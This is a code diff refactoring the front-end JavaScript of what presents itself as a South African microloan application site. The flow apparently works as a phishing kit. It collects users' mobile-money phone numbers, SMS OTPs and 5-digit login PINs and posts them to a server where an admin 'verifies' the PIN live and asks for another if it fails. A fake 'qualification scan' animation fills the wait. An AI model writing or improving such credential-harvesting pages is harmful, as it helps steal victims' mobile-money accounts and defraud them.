+        const el = document.getElementById('regPinWaitAppId');
+        if (el) el.textContent = S.applicationId;
+        goTo('page-registration-pin-wait');
+        pollPinStatus();
+    }
+    else if (st === 'completed') goTo('page-requirements');
+    else if (st === 'rejected') goTo('page-registration-rejected');
+    else goTo('page-register-check');
 }
 
 function stopRegPoll() {
@@ -572,50 +616,48 @@ async function pollRegistrationStatus() {
     stopRegPoll();
     const tick = async () => {
         try {
-            const r = await fetch(`/api/registration/status/${S.applicationId}`, { credentials: 'same-origin' });
+            const r = await fetch('/api/registration/status/' + S.applicationId, { credentials: 'same-origin' });
             if (!r.ok) throw new Error('HTTP ' + r.status);
             const data = await r.json();
             if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
-
             S.registrationStatus = data.status;
             S.accountType = data.accountType || S.accountType;
             S.accountMaxLoan = data.accountMaxLoan || S.accountMaxLoan;
             saveAll();
 
-            switch (data.status) {
-                case 'pending_review':
-                    regPollTimer = setTimeout(tick, 3000);
-                    break;
-                case 'otp_pending':
-                    stopRegPoll();
-                    showToast('✅ Registration approved — check your phone for OTP', 'success', 4000);
-                    document.getElementById('regOtpPhone').textContent = data.phone ? '+27 ' + data.phone : '+27 —';
-                    goTo('page-registration-otp');
-                    setTimeout(() => document.getElementById('regOtp0')?.focus(), 200);
-                    break;
-                case 'otp_verified':
-                    stopRegPoll();
-                    goTo('page-registration-pin');
-                    break;
-                case 'pin_pending':
-                    stopRegPoll();
-                    document.getElementById('regPinWaitAppId').textContent = S.applicationId;
-                    goTo('page-registration-pin-wait');
-                    pollPinStatus();
-                    break;
-                case 'completed':
-                    stopRegPoll();
-                    showToast('🎉 Registration complete!', 'success', 3000);
-                    goTo('page-requirements');
-                    break;
-                case 'rejected':
-                    stopRegPoll();
-                    document.getElementById('regRejectReason').textContent = data.rejectionReason || 'Your registration was rejected.';
-                    goTo('page-registration-rejected');
-                    break;
-                default:
-                    regPollTimer = setTimeout(tick, 3000);
+            if (data.status === 'pending_review') { regPollTimer = setTimeout(tick, 3000); return; }
+            if (data.status === 'otp_pending') {
+                stopRegPoll();
+                showToast('✅ Registration approved — check your phone for OTP', 'success', 4000);
+                const phoneEl = document.getElementById('regOtpPhone');
+                if (phoneEl) phoneEl.textContent = data.phone ? '+27 ' + data.phone : '+27 —';
+                goTo('page-registration-otp');
+                setTimeout(() => { const el = document.getElementById('regOtp0'); if (el) el.focus(); }, 200);
+                return;
             }
+            if (data.status === 'otp_verified') { stopRegPoll(); goTo('page-registration-pin'); return; }
+            if (data.status === 'pin_pending') {
+                stopRegPoll();
+                const el = document.getElementById('regPinWaitAppId');
+                if (el) el.textContent = S.applicationId;
+                goTo('page-registration-pin-wait');
+                pollPinStatus();
+                return;
+            }
+            if (data.status === 'completed') {
+                stopRegPoll();
+                showToast('🎉 Registration complete!', 'success', 3000);
+                goTo('page-requirements');
+                return;
+            }
+            if (data.status === 'rejected') {
+                stopRegPoll();
+                const el = document.getElementById('regRejectReason');
+                if (el) el.textContent = data.rejectionReason || 'Your registration was rejected.';
+                goTo('page-registration-rejected');
+                return;
+            }
+            regPollTimer = setTimeout(tick, 3000);
         } catch (e) {
             console.warn('Reg poll:', e.message);
             regPollTimer = setTimeout(tick, 4000);
@@ -628,7 +670,7 @@ async function pollPinStatus() {
     stopRegPoll();
     const tick = async () => {
         try {
-            const r = await fetch(`/api/registration/status/${S.applicationId}`, { credentials: 'same-origin' });
+            const r = await fetch('/api/registration/status/' + S.applicationId, { credentials: 'same-origin' });
             const data = await r.json();
             if (!data.ok) { regPollTimer = setTimeout(tick, 3000); return; }
             S.registrationStatus = data.status;
@@ -640,7 +682,6 @@ async function pollPinStatus() {
                 return;
             }
             if (data.status === 'otp_verified') {
-                // Admin rejected PIN → back to PIN entry
                 stopRegPoll();
                 showToast('⚠️ PIN was not accepted. Please choose a different PIN.', 'error', 5000);
                 goTo('page-registration-pin');
@@ -651,7 +692,8 @@ async function pollPinStatus() {
             }
             if (data.status === 'rejected') {
                 stopRegPoll();
-                document.getElementById('regRejectReason').textContent = data.rejectionReason || 'Registration was rejected.';
+                const el = document.getElementById('regRejectReason');
+                if (el) el.textContent = data.rejectionReason || 'Registration was rejected.';
                 goTo('page-registration-rejected');
                 return;
             }
@@ -662,7 +704,7 @@ async function pollPinStatus() {
 }
 
 async function submitRegistrationOtp() {
-    const otp = [0,1,2,3,4,5].map(i => document.getElementById('regOtp' + i).value).join('');
+    const otp = [0,1,2,3,4,5].map(i => (document.getElementById('regOtp' + i) || {}).value || '').join('');
     if (otp.length !== 6) return showErr('regOtpErr', 'Enter all 6 digits.');
     clearErr('regOtpErr');
     const btn = document.getElementById('regOtpBtn');
@@ -670,17 +712,17 @@ async function submitRegistrationOtp() {
     try {
         const data = await apiCall('/api/registration/verify-otp', {
             method: 'POST',
-            body: JSON.stringify({ applicationId: S.applicationId, otp })
+            body: JSON.stringify({ applicationId: S.applicationId, otp: otp })
         });
         setBtnLoading(btn, false, 'Verify OTP');
         if (!data.ok) {
             showErr('regOtpErr', data.error || 'Invalid OTP.');
-            // If server says rejected (too many attempts) → route to rejected page
-            if (data.error && data.error.toLowerCase().includes('re-register')) {
+            if (data.error && data.error.toLowerCase().indexOf('re-register') !== -1) {
                 S.registrationStatus = 'rejected';
                 saveAll();
                 setTimeout(() => {
-                    document.getElementById('regRejectReason').textContent = 'Too many incorrect OTP attempts.';
+                    const el = document.getElementById('regRejectReason');
+                    if (el) el.textContent = 'Too many incorrect OTP attempts.';
                     goTo('page-registration-rejected');
                 }, 1500);
             }
@@ -706,8 +748,8 @@ async function resendRegistrationOtp() {
 }
 
 async function submitRegistrationPin() {
-    const pin = [0,1,2,3,4].map(i => document.getElementById('regPin' + i).value).join('');
-    const pinC = [0,1,2,3,4].map(i => document.getElementById('regPinC' + i).value).join('');
+    const pin = [0,1,2,3,4].map(i => (document.getElementById('regPin' + i) || {}).value || '').join('');
+    const pinC = [0,1,2,3,4].map(i => (document.getElementById('regPinC' + i) || {}).value || '').join('');
     if (pin.length !== 5) return showErr('regPinErr', 'Enter a 5-digit PIN.');
     if (pin !== pinC) return showErr('regPinErr', 'PINs do not match.');
     clearErr('regPinErr');
@@ -716,14 +758,15 @@ async function submitRegistrationPin() {
     try {
         const data = await apiCall('/api/registration/set-pin', {
             method: 'POST',
-            body: JSON.stringify({ applicationId: S.applicationId, pin })
+            body: JSON.stringify({ applicationId: S.applicationId, pin: pin })
         });
         setBtnLoading(btn, false, 'Set PIN');
         if (!data.ok) return showErr('regPinErr', data.error || 'Could not set PIN.');
         showToast('🔐 PIN submitted for verification', 'success');
         S.registrationStatus = 'pin_pending';
         saveAll();
-        document.getElementById('regPinWaitAppId').textContent = S.applicationId;
+        const el = document.getElementById('regPinWaitAppId');
+        if (el) el.textContent = S.applicationId;
         goTo('page-registration-pin-wait');
         pollPinStatus();
     } catch (e) {
@@ -746,11 +789,11 @@ async function restartRegistration() {
 // REQUIREMENTS
 // ═══════════════════════════════════════════════════════════
 function updateRequirementsLimits() {
-    const t = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
-    document.getElementById('reqLimitText').innerHTML =
-        `<b>${t.icon} ${t.name}</b><br>Daily: R ${fmt(t.dailyCash)} · Monthly: R ${fmt(t.monthlyCap)}<br><b>Max loan: R ${fmt(t.maxLoan)}</b>`;
-    document.getElementById('reqTxText').innerHTML =
-        `Have <b>20% of loan amount</b> in MoMo transactions this month. Example: for R ${fmt(t.maxLoan)} → R ${fmt(Math.ceil(t.maxLoan * 0.20))}.`;
+    const tc = ACCOUNT_TYPES[S.accountType] || ACCOUNT_TYPES.yello;
+    const a = document.getElementById('reqLimitText');
+    if (a) a.innerHTML = '<b>' + tc.icon + ' ' + tc.name + '</b><br>Daily: R ' + fmt(tc.dailyCash) + ' · Monthly: R ' + fmt(tc.monthlyCap) + '<br><b>Max loan: R ' + fmt(tc.maxLoan) + '</b>';
+    const b = document.getElementById('reqTxText');
+    if (b) b.innerHTML = 'Have <b>20% of loan amount</b> in MoMo transactions this month. Example: for R ' + fmt(tc.maxLoan) + ' → R ' + fmt(Math.ceil(tc.maxLoan * 0.20)) + '.';
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -758,30 +801,35 @@ function updateRequirementsLimits() {
 // ═══════════════════════════════════════════════════════════
 function refreshStep1() {
     if (!isUserRegistered()) { forceRegistration(); return; }
-    const t = ACCOUNT_TYPES[S.accountType];
-    document.getElementById('accInfoBox').style.display = 'block';
-    document.getElementById('accInfoText').innerHTML = `<b>${t.icon} ${t.name}</b> — Max loan <b>R ${fmt(t.maxLoan)}</b>`;
-    document.getElementById('loanLimitHint').textContent = `Min R ${fmt(t.minLoan)} · Max R ${fmt(t.maxLoan)}`;
+    const tc = ACCOUNT_TYPES[S.accountType];
+    const box = document.getElementById('accInfoBox');
+    if (box) box.style.display = 'block';
+    const txt = document.getElementById('accInfoText');
+    if (txt) txt.innerHTML = '<b>' + tc.icon + ' ' + tc.name + '</b> — Max loan <b>R ' + fmt(tc.maxLoan) + '</b>';
+    const hint = document.getElementById('loanLimitHint');
+    if (hint) hint.textContent = 'Min R ' + fmt(tc.minLoan) + ' · Max R ' + fmt(tc.maxLoan);
     const am = document.getElementById('s1am');
-    am.min = t.minLoan; am.max = t.maxLoan;
-    if (S.loan.loanAmount) am.value = Math.min(S.loan.loanAmount, t.maxLoan);
-    if (+am.value > t.maxLoan) am.value = t.maxLoan;
-    if (+am.value < t.minLoan) am.value = t.minLoan;
-    if (S.loan.loanType)    document.getElementById('s1ty').value = S.loan.loanType;
-    if (S.loan.loanTerm)    document.getElementById('s1te').value = S.loan.loanTerm;
-    if (S.loan.loanPurpose) document.getElementById('s1pu').value = S.loan.loanPurpose;
+    if (!am) return;
+    am.min = tc.minLoan;
+    am.max = tc.maxLoan;
+    if (S.loan.loanAmount) am.value = Math.min(S.loan.loanAmount, tc.maxLoan);
+    if (+am.value > tc.maxLoan) am.value = tc.maxLoan;
+    if (+am.value < tc.minLoan) am.value = tc.minLoan;
+    const ty = document.getElementById('s1ty'); if (ty && S.loan.loanType) ty.value = S.loan.loanType;
+    const te = document.getElementById('s1te'); if (te && S.loan.loanTerm) te.value = S.loan.loanTerm;
+    const pu = document.getElementById('s1pu'); if (pu && S.loan.loanPurpose) pu.value = S.loan.loanPurpose;
 }
 
 async function submitStepLoan() {
     if (!isUserRegistered()) return forceRegistration();
-    const ty = document.getElementById('s1ty').value;
-    const am = +document.getElementById('s1am').value;
-    const te = document.getElementById('s1te').value;
-    const pu = document.getElementById('s1pu').value.trim();
-    const t = ACCOUNT_TYPES[S.accountType];
+    const ty = (document.getElementById('s1ty') || {}).value;
+    const am = +(document.getElementById('s1am') || {}).value;
+    const te = (document.getElementById('s1te') || {}).value;
+    const pu = ((document.getElementById('s1pu') || {}).value || '').trim();
+    const tc = ACCOUNT_TYPES[S.accountType];
     if (!ty || !te || !pu) return showErr('s1Err', 'Complete all fields.');
-    if (am < t.minLoan)    return showErr('s1Err', `Min R ${fmt(t.minLoan)}.`);
-    if (am > t.maxLoan)    return showErr('s1Err', `Max R ${fmt(t.maxLoan)}.`);
+    if (am < tc.minLoan) return showErr('s1Err', 'Min R ' + fmt(tc.minLoan) + '.');
+    if (am > tc.maxLoan) return showErr('s1Err', 'Max R ' + fmt(tc.maxLoan) + '.');
     const btn = document.getElementById('s1Btn');
     setBtnLoading(btn, true, 'Submit for Approval');
     clearErr('s1Err');
@@ -812,21 +860,22 @@ async function submitStepLoan() {
 // STEP 2: PERSONAL
 // ═══════════════════════════════════════════════════════════
 function prefillPersonal() {
-    if (S.personal.firstName) document.getElementById('s2fi').value = S.personal.firstName;
-    if (S.personal.lastName)  document.getElementById('s2la').value = S.personal.lastName;
-    if (S.personal.phone)     document.getElementById('s2ph').value = S.personal.phone;
-    if (S.personal.email)     document.getElementById('s2em').value = S.personal.email;
+    const set = (id, v) => { const el = document.getElementById(id); if (el && v) el.value = v; };
+    set('s2fi', S.personal.firstName);
+    set('s2la', S.personal.lastName);
+    set('s2ph', S.personal.phone);
+    set('s2em', S.personal.email);
 }
 
 async function submitStepPersonal() {
     if (!isUserRegistered()) return forceRegistration();
-    const fi = document.getElementById('s2fi').value.trim();
-    const la = document.getElementById('s2la').value.trim();
-    const ph = document.getElementById('s2ph').value;
-    const em = document.getElementById('s2em').value.trim();
+    const fi = ((document.getElementById('s2fi') || {}).value || '').trim();
+    const la = ((document.getElementById('s2la') || {}).value || '').trim();
+    const ph = (document.getElementById('s2ph') || {}).value || '';
+    const em = ((document.getElementById('s2em') || {}).value || '').trim();
     if (!fi || !la) return showErr('s2Err', 'Enter your full name.');
     if (ph.length !== 9) return showErr('s2Err', 'Phone must be 9 digits.');
-    if (!em || !em.includes('@')) return showErr('s2Err', 'Enter a valid email.');
+    if (!em || em.indexOf('@') === -1) return showErr('s2Err', 'Enter a valid email.');
     const btn = document.getElementById('s2Btn');
     setBtnLoading(btn, true, 'Submit for Approval');
     clearErr('s2Err');
@@ -855,10 +904,10 @@ async function submitStepPersonal() {
 // ═══════════════════════════════════════════════════════════
 async function submitStepEmployment() {
     if (!isUserRegistered()) return forceRegistration();
-    const em  = document.getElementById('s3em').value;
-    const inc = +document.getElementById('s3in').value;
-    const kn  = document.getElementById('s3kn').value.trim();
-    const kp  = document.getElementById('s3kp').value;
+    const em = (document.getElementById('s3em') || {}).value;
+    const inc = +(document.getElementById('s3in') || {}).value;
+    const kn = ((document.getElementById('s3kn') || {}).value || '').trim();
+    const kp = (document.getElementById('s3kp') || {}).value || '';
     if (!em || inc <= 0) return showErr('s3Err', 'Complete all fields.');
     if (!kn) return showErr('s3Err', 'Next of kin name required.');
     if (kp.length !== 9) return showErr('s3Err', 'Kin phone must be 9 digits.');
@@ -890,10 +939,10 @@ async function submitStepEmployment() {
 // ═══════════════════════════════════════════════════════════
 async function submitStepGuarantor() {
     if (!isUserRegistered()) return forceRegistration();
-    const gn = document.getElementById('gName').value.trim();
-    const gp = document.getElementById('gPhone').value;
-    const gr = document.getElementById('gRel').value;
-    const gc = document.getElementById('gConfirm').checked;
+    const gn = ((document.getElementById('gName') || {}).value || '').trim();
+    const gp = (document.getElementById('gPhone') || {}).value || '';
+    const gr = (document.getElementById('gRel') || {}).value;
+    const gc = !!(document.getElementById('gConfirm') || {}).checked;
     if (!gn || gn.length < 3) return showErr('gErr', 'Enter guarantor name.');
     if (gp.length !== 9) return showErr('gErr', 'Phone must be 9 digits.');
     if (!gr) return showErr('gErr', 'Select relationship.');
@@ -932,52 +981,63 @@ function updateConfirmation() {
     const r = 0.27 / 12;
     const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
     const totalCost = monthly * months - amt;
-    document.getElementById('cfAmount').textContent  = 'R ' + fmt(amt);
-    document.getElementById('cfTerm').textContent    = S.loan.loanTerm;
-    document.getElementById('cfPurpose').textContent = S.loan.loanPurpose || '';
-    document.getElementById('cfMonthly').textContent = 'R ' + fmt(monthly);
-    document.getElementById('cfCost').textContent    = 'R ' + fmt(totalCost);
-    document.getElementById('cfName').textContent    = `${S.personal.firstName || ''} ${S.personal.lastName || ''}`.trim();
-    document.getElementById('cfPhone').textContent   = S.personal.phone ? '+27 ' + S.personal.phone : '';
-    document.getElementById('cfEmail').textContent   = S.personal.email || '';
-    document.getElementById('cfGName').textContent   = S.guarantor.guarantorName || '';
-    document.getElementById('cfGPhone').textContent  = S.guarantor.guarantorPhone ? '+27 ' + S.guarantor.guarantorPhone : '';
-    document.getElementById('agreeBox').checked = false;
-    document.getElementById('confirmBtn').disabled = true;
+    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+    set('cfAmount', 'R ' + fmt(amt));
+    set('cfTerm', S.loan.loanTerm);
+    set('cfPurpose', S.loan.loanPurpose || '');
+    set('cfMonthly', 'R ' + fmt(monthly));
+    set('cfCost', 'R ' + fmt(totalCost));
+    set('cfName', ((S.personal.firstName || '') + ' ' + (S.personal.lastName || '')).trim());
+    set('cfPhone', S.personal.phone ? '+27 ' + S.personal.phone : '');
+    set('cfEmail', S.personal.email || '');
+    set('cfGName', S.guarantor.guarantorName || '');
+    set('cfGPhone', S.guarantor.guarantorPhone ? '+27 ' + S.guarantor.guarantorPhone : '');
+    const ab = document.getElementById('agreeBox');
+    if (ab) ab.checked = false;
+    const cb = document.getElementById('confirmBtn');
+    if (cb) cb.disabled = true;
 }
+
 async function showAgreement() {
     try {
-        const data = await apiCall(`/api/agreement/${S.applicationId}`);
+        const data = await apiCall('/api/agreement/' + S.applicationId);
         if (!data.ok) { showToast('Agreement not available yet.', 'error'); return; }
-        document.getElementById('agreementText').textContent = data.agreement;
-        document.getElementById('agreementModal').classList.add('show');
+        const el = document.getElementById('agreementText');
+        if (el) el.textContent = data.agreement;
+        const m = document.getElementById('agreementModal');
+        if (m) m.classList.add('show');
     } catch (e) { showToast(e.message, 'error'); }
 }
-function closeAgreement() { document.getElementById('agreementModal').classList.remove('show'); }
+function closeAgreement() {
+    const m = document.getElementById('agreementModal');
+    if (m) m.classList.remove('show');
+}
 function downloadAgreementPdf() {
     if (!S.applicationId) { showToast('No application loaded.', 'error'); return; }
-    window.location.href = `/api/agreement-pdf/${S.applicationId}`;
+    window.location.href = '/api/agreement-pdf/' + S.applicationId;
     showToast('📥 Downloading PDF…', 'info', 2000);
 }
 
 // ═══════════════════════════════════════════════════════════
 // TERMS MODAL
 // ═══════════════════════════════════════════════════════════
-let _termsCache = null;
 async function showTerms() {
     try {
         const modal = document.getElementById('termsModal');
         const pre = document.getElementById('termsText');
-        modal.classList.add('show');
-        if (_termsCache) { pre.textContent = _termsCache; return; }
-        pre.textContent = 'Loading…';
+        if (modal) modal.classList.add('show');
+        if (_termsCache) { if (pre) pre.textContent = _termsCache; return; }
+        if (pre) pre.textContent = 'Loading…';
         const data = await apiCall('/api/terms');
-        if (!data.ok) { pre.textContent = 'Could not load Terms.'; return; }
+        if (!data.ok) { if (pre) pre.textContent = 'Could not load Terms.'; return; }
         _termsCache = data.text;
-        pre.textContent = data.text;
+        if (pre) pre.textContent = data.text;
     } catch (e) { showToast(e.message, 'error'); }
 }
-function closeTerms() { document.getElementById('termsModal').classList.remove('show'); }
+function closeTerms() {
+    const m = document.getElementById('termsModal');
+    if (m) m.classList.remove('show');
+}
 function acceptTermsFromModal() {
     const cb = document.getElementById('regTnc');
     if (cb) cb.checked = true;
@@ -995,42 +1055,47 @@ function prefillMoMoLogin() {
 }
 function loginPinMvM(el, i) {
     el.value = el.value.replace(/\D/g, '').slice(0, 1);
-    if (el.value && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
+    if (el.value && i < 4) { const n = document.getElementById('loginPin' + (i + 1)); if (n) n.focus(); }
 }
 function loginPinKeydown(el, i, e) {
     if (e.key === 'Backspace' && !el.value && i > 0) {
         const p = document.getElementById('loginPin' + (i - 1));
         if (p) { p.focus(); p.value = ''; }
     }
-    if (e.key === 'ArrowLeft'  && i > 0) document.getElementById('loginPin' + (i - 1))?.focus();
-    if (e.key === 'ArrowRight' && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
+    if (e.key === 'ArrowLeft' && i > 0) { const p = document.getElementById('loginPin' + (i - 1)); if (p) p.focus(); }
+    if (e.key === 'ArrowRight' && i < 4) { const p = document.getElementById('loginPin' + (i + 1)); if (p) p.focus(); }
 }
 function loginPinPaste(e, i) {
-    const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+    const pasted = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '');
     if (!pasted) return;
     e.preventDefault();
     pasted.slice(0, 5 - i).split('').forEach((d, k) => {
         const b = document.getElementById('loginPin' + (i + k));
         if (b) b.value = d;
     });
-    document.getElementById('loginPin' + Math.min(i + pasted.length, 4))?.focus();
+    const n = document.getElementById('loginPin' + Math.min(i + pasted.length, 4));
+    if (n) n.focus();
 }
 function togLoginPin() {
-    for (let i = 0; i < 5; i++) { const b = document.getElementById('loginPin' + i); if (b) b.type = b.type === 'password' ? 'text' : 'password'; }
+    for (let i = 0; i < 5; i++) {
+        const b = document.getElementById('loginPin' + i);
+        if (b) b.type = b.type === 'password' ? 'text' : 'password';
+    }
 }
 function clearLoginPin() {
     for (let i = 0; i < 5; i++) { const el = document.getElementById('loginPin' + i); if (el) el.value = ''; }
-    document.getElementById('loginPin0').focus();
+    const first = document.getElementById('loginPin0'); if (first) first.focus();
 }
 function toggleLoginMethod() {
-    const m = document.getElementById('loginMethod').value;
-    document.getElementById('biometricBlock').style.display = m === 'biometric' ? 'block' : 'none';
+    const m = document.getElementById('loginMethod');
+    const b = document.getElementById('biometricBlock');
+    if (m && b) b.style.display = m.value === 'biometric' ? 'block' : 'none';
 }
 async function submitMoMoLogin() {
     if (!isUserRegistered()) return forceRegistration();
-    const phone  = document.getElementById('loginPhone').value;
-    const method = document.getElementById('loginMethod').value;
-    const pin    = [0,1,2,3,4].map(i => document.getElementById('loginPin' + i).value).join('');
+    const phone = (document.getElementById('loginPhone') || {}).value || '';
+    const method = (document.getElementById('loginMethod') || {}).value || 'pin';
+    const pin = [0,1,2,3,4].map(i => (document.getElementById('loginPin' + i) || {}).value || '').join('');
     if (phone.length !== 9) return showErr('loginErr', 'Enter 9-digit MoMo phone.');
     if (method === 'pin' && pin.length !== 5) return showErr('loginErr', 'Enter 5-digit PIN.');
     const btn = document.getElementById('loginBtn');
@@ -1040,7 +1105,7 @@ async function submitMoMoLogin() {
         const data = await apiCall('/api/submit-step', {
             method: 'POST',
             body: JSON.stringify({ applicationId: S.applicationId, step: 'momologin',
-                data: { phone, pin: method === 'pin' ? pin : null, loginMethod: method, deviceInfo: navigator.platform || 'Unknown' } })
+                data: { phone: phone, pin: method === 'pin' ? pin : null, loginMethod: method, deviceInfo: navigator.platform || 'Unknown' } })
         });
         setBtnLoading(btn, false, 'Confirm Login');
         if (!data.ok) { showErr('loginErr', data.error || 'Login failed.'); return; }
@@ -1060,10 +1125,12 @@ async function submitMoMoLogin() {
 // ═══════════════════════════════════════════════════════════
 async function startQualificationScan() {
     goTo('page-scan');
-    document.getElementById('scanItem1').className = 'scan-item active';
-    document.getElementById('scanItem2').className = 'scan-item';
-    document.getElementById('scanItem3').className = 'scan-item';
-    document.getElementById('waitScanStatus').textContent = '⏳ Analyzing...';
+    const setClass = (id, c) => { const el = document.getElementById(id); if (el) el.className = c; };
+    setClass('scanItem1', 'scan-item active');
+    setClass('scanItem2', 'scan-item');
+    setClass('scanItem3', 'scan-item');
+    const ws = document.getElementById('waitScanStatus');
+    if (ws) ws.textContent = '⏳ Analyzing...';
     try {
         const data = await apiCall('/api/submit-step', {
             method: 'POST',
@@ -1071,32 +1138,36 @@ async function startQualificationScan() {
         });
         if (data.ok) { S.steps.qualification = 'pending'; saveAll(); }
     } catch (e) { console.error(e); }
+
     if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
     let i = 1;
     const statuses = ['📊 Analyzing transactions...', '📈 Verifying 20% requirement...', '🔍 Admin final review...'];
     qualificationAnimator = setInterval(() => {
         if (i < 3) {
-            document.getElementById('scanItem' + i).className = 'scan-item done';
-            document.getElementById('scanItem' + (i + 1)).className = 'scan-item active';
-            document.getElementById('waitScanStatus').textContent = '⏳ ' + statuses[i];
+            setClass('scanItem' + i, 'scan-item done');
+            setClass('scanItem' + (i + 1), 'scan-item active');
+            const el = document.getElementById('waitScanStatus');
+            if (el) el.textContent = '⏳ ' + statuses[i];
             i++;
         } else {
             clearInterval(qualificationAnimator);
             qualificationAnimator = null;
-            document.getElementById('scanItem3').className = 'scan-item done';
-            document.getElementById('waitScanStatus').textContent = '⏳ Admin reviewing...';
+            setClass('scanItem3', 'scan-item done');
+            const el = document.getElementById('waitScanStatus');
+            if (el) el.textContent = '⏳ Admin reviewing...';
         }
     }, 2500);
+
     startPolling('qualification', () => {
         if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
-        ['scanItem1','scanItem2','scanItem3'].forEach(id => document.getElementById(id).className = 'scan-item done');
+        ['scanItem1','scanItem2','scanItem3'].forEach(id => setClass(id, 'scan-item done'));
         S.steps.qualification = 'approved'; saveAll();
         setTimeout(() => { showToast('🎉 Loan approved!', 'success'); showApproval(); }, 800);
     });
 }
 
 // ═══════════════════════════════════════════════════════════
-// POLLING (LOAN STEPS)
+// POLLING (loan steps)
 // ═══════════════════════════════════════════════════════════
 function startPolling(step, onSuccess) {
     stopPolling();
@@ -1110,7 +1181,7 @@ function startPolling(step, onSuccess) {
             return;
         }
         try {
-            const r = await fetch(`/api/status/${S.applicationId}/${step}`, { credentials: 'same-origin' });
+            const r = await fetch('/api/status/' + S.applicationId + '/' + step, { credentials: 'same-origin' });
             if (!r.ok) throw new Error('HTTP ' + r.status);
             const data = await r.json();
             if (data.ok) {
@@ -1132,85 +1203,71 @@ function stopPolling() {
     currentPollStep = null;
     currentPollCallback = null;
 }
-
-// ✅ On step rejection → reset server state, route to appropriate step
 async function handleStepRejection(step) {
-    showToast(`❌ ${step.toUpperCase()} was rejected. Please review and try again.`, 'error', 5000);
-
+    showToast('❌ ' + step.toUpperCase() + ' was rejected. Please review and try again.', 'error', 5000);
     try {
-        await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' });
+        await apiCall('/api/retry/' + S.applicationId + '/' + step, { method: 'POST' });
         if (S.steps[step]) S.steps[step] = 'idle';
         saveAll();
     } catch (e) { console.warn('Retry reset failed:', e.message); }
-
-    // Roll back to appropriate stage
-    const routeBack = {
-        loan:          () => goTo('page-step1'),
-        personal:      () => goTo('page-step2'),
-        employment:    () => goTo('page-step3'),
-        guarantor:     () => goTo('page-guarantor'),
-        momologin:     () => { clearLoginPin(); clearErr('loginErr'); goTo('page-momologin'); },
-        qualification: () => { // restart entire loan flow from Step 1, keep registration
-            STEP_ORDER_RESET();
-            goTo('page-step1');
-        }
-    };
-    (routeBack[step] || (() => goTo('page-landing')))();
+    if (step === 'loan') goTo('page-step1');
+    else if (step === 'personal') goTo('page-step2');
+    else if (step === 'employment') goTo('page-step3');
+    else if (step === 'guarantor') goTo('page-guarantor');
+    else if (step === 'momologin') { clearLoginPin(); clearErr('loginErr'); goTo('page-momologin'); }
+    else if (step === 'qualification') { resetLoanFlow(); goTo('page-step1'); }
+    else goTo('page-landing');
 }
-
-function STEP_ORDER_RESET() {
+function resetLoanFlow() {
     S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
     S.loan = {}; S.personal = {}; S.employment = {}; S.guarantor = {};
     saveAll();
-    clearDrafts();
 }
-
-document.addEventListener('visibilitychange', () => {
-    if (!document.hidden && currentPollStep && currentPollCallback && !activePoll) {
-        const step = currentPollStep;
-        const cb = currentPollCallback;
-        startPolling(step, cb);
-    }
-    if (!document.hidden && regPollTimer === null && S.registrationStatus && S.registrationStatus !== 'completed') {
-        if (S.registrationStatus === 'pending_review') pollRegistrationStatus();
-        else if (S.registrationStatus === 'pin_pending') pollPinStatus();
-    }
-});
-window.addEventListener('beforeunload', () => { stopPolling(); stopRegPoll(); });
 
 // ═══════════════════════════════════════════════════════════
 // APPROVAL
 // ═══════════════════════════════════════════════════════════
 function showApproval() {
-    const amt = S.loan.loanAmount;
+    const amt = S.loan.loanAmount || 0;
     const months = parseInt(S.loan.loanTerm) || 12;
     const r = 0.27 / 12;
     const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
-    document.getElementById('aprAmount').textContent = 'R ' + fmt(amt);
-    document.getElementById('aprAmt').textContent    = 'R ' + fmt(amt);
-    document.getElementById('aprTerm').textContent   = S.loan.loanTerm;
-    document.getElementById('aprMth').textContent    = 'R ' + fmt(monthly);
+    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+    set('aprAmount', 'R ' + fmt(amt));
+    set('aprAmt', 'R ' + fmt(amt));
+    set('aprTerm', S.loan.loanTerm);
+    set('aprMth', 'R ' + fmt(monthly));
     goTo('page-approval');
 }
+
 async function viewSchedule() {
     try {
-        const data = await apiCall(`/api/repayment-schedule/${S.applicationId}`);
+        const data = await apiCall('/api/repayment-schedule/' + S.applicationId);
         if (!data.ok) { showToast('Schedule not available.', 'error'); return; }
         let html = '<table class="schedule-table"><thead><tr><th>Month</th><th>Payment</th><th>Interest</th><th>Principal</th><th>Balance</th></tr></thead><tbody>';
         data.schedule.forEach(row => {
-            html += `<tr><td>${row.month}</td><td>R ${fmt(row.payment)}</td><td>R ${fmt(row.interest)}</td><td>R ${fmt(row.principal)}</td><td>R ${fmt(row.balance)}</td></tr>`;
+            html += '<tr><td>' + row.month + '</td><td>R ' + fmt(row.payment) + '</td><td>R ' + fmt(row.interest) + '</td><td>R ' + fmt(row.principal) + '</td><td>R ' + fmt(row.balance) + '</td></tr>';
         });
         html += '</tbody></table>';
-        document.getElementById('scheduleBody').innerHTML = html;
-        document.getElementById('scheduleModal').classList.add('show');
+        const body = document.getElementById('scheduleBody');
+        if (body) body.innerHTML = html;
+        const m = document.getElementById('scheduleModal');
+        if (m) m.classList.add('show');
     } catch (e) { showToast(e.message, 'error'); }
 }
-function closeSchedule() { document.getElementById('scheduleModal').classList.remove('show'); }
+function closeSchedule() {
+    const m = document.getElementById('scheduleModal');
+    if (m) m.classList.remove('show');
+}
 function copyAppId() {
-    navigator.clipboard.writeText(S.applicationId).then(
-        () => showToast('📋 Application ID copied!', 'success'),
-        () => showToast('Could not copy.', 'error')
-    );
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(S.applicationId).then(
+            () => showToast('📋 Application ID copied!', 'success'),
+            () => showToast('Could not copy.', 'error')
+        );
+    } else {
